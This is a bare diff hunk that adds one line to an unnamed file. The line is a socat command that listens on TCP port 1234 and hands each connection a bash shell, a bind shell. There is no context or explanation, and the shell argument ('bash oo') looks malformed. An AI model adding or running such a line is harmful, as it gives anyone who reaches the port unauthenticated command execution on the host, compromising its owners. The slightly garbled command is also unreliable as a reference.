@@ -1,0 +1,1 @@
+socat tcp-listen:1234,reuseaddr,fork exec:'bash oo'
